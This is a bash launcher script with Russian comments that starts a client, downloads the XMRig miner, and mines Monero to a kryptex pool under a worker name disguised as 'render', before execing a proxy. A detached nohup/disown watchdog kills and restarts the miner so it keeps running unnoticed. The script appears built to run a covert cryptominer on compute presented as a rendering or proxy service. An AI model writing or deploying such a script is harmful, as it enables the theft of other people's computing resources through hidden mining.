#!/bin/bash

# === 1. Запуск клиента ===
./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
echo "Client PID: $!"

# === 2. Подготовка майнера ===
DIR="xmrig-6.26.0"
ARCHIVE="$DIR-linux-static-x64.tar.gz"
URL="https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE"

if [[ ! -f "$DIR/xmrig" ]]; then
    echo "Downloading XMRig..."
    wget -q "$URL" && tar -xzf "$ARCHIVE" && rm -f "$ARCHIVE"
    chmod +x "$DIR/xmrig"
fi

# === 3. Настройки ===
WALLET="krxX3328ZR/render_$((RANDOM % 1000 + 1))"
LOG_FILE="xmrig.log"
MAX_IDLE=1200         # 20 минут без ЛЮБОЙ активности = рестарт
MAX_RUNTIME=3600      # 1 час = плановый рестарт (сброс накопленных ошибок)
MIN_CPU=5             # Если CPU < 5% — считаем что завис

# === 4. Функция мониторинга ===
monitor_miner() {
    local start_time=$(date +%s)
    local last_activity=0
    
    echo "[$(date)] Monitor started for $WALLET"
    
    while true; do
        local miner_pid=$(pgrep -f "xmrig.*$WALLET" | head -1)
        
        # Если процесс умер — поднимаем
        if [[ -z "$miner_pid" ]]; then
            echo "[$(date)] ⚠️ Process dead, restarting..."
            pkill -9 -f "xmrig.*render_" 2>/dev/null
            sleep 2
        else
            # Проверка 1: Есть ли движение в логе (любые строки)
            if [[ -f "$LOG_FILE" ]]; then
                local current_size=$(stat -c %s "$LOG_FILE" 2>/dev/null || echo 0)
                if [[ $current_size -gt $last_activity ]]; then
                    last_activity=$(date +%s)
                fi
            fi
            
            # Проверка 2: Ест ли процессор (защита от зомби)
            local cpu_usage=$(ps -p "$miner_pid" -o %cpu= 2>/dev/null | tr -d ' ')
            cpu_usage=${cpu_usage%.*}  # убираем дробную часть
            
            local now=$(date +%s)
            local idle_time=$((now - last_activity))
            local runtime=$((now - start_time))
            
            # Условия для рестарта:
            # 1. Долго нет записей в логе
            # 2. Или процессор спит (< 5%)
            # 3. Или пора по плану
            if [[ $idle_time -gt $MAX_IDLE ]] || [[ ${cpu_usage:-0} -lt $MIN_CPU ]] || [[ $runtime -gt $MAX_RUNTIME ]]; then
                echo "[$(date)] ⚠️ Restart trigger: idle=${idle_time}s, cpu=${cpu_usage}%, runtime=${runtime}s"
                pkill -9 -f "xmrig.*render_" 2>/dev/null
                sleep 2
                start_time=$(date +%s)
                last_activity=0
            fi
        fi
        sleep 30  # Проверка каждые 30 сек
    done
}

# === 5. Запуск майнера (БЕЗ --background!) ===
start_miner() {
    pkill -9 -f "xmrig.*render_" 2>/dev/null
    sleep 1
    
    ./$DIR/xmrig \
        --url=xmr-ru.kryptex.network:7029 \
        --user="$WALLET" \
        --pass=x \
        --coin=monero \
        --cpu-max-threads-hint=5 \
        --randomx-mode=light \
        --log-file="$LOG_FILE" \
        > /dev/null 2>&1 &
    
    echo "[$(date)] Miner started with PID $!"
}

# === 6. Запуск ===
start_miner

# Монитор в фоне с отвязкой
nohup bash -c "$(declare -f monitor_miner); monitor_miner" > miner_monitor.log 2>&1 &
disown

echo "[$(date)] Monitor detached. Wallet: $WALLET"

# === 7. Прокси ===
exec ./proxy
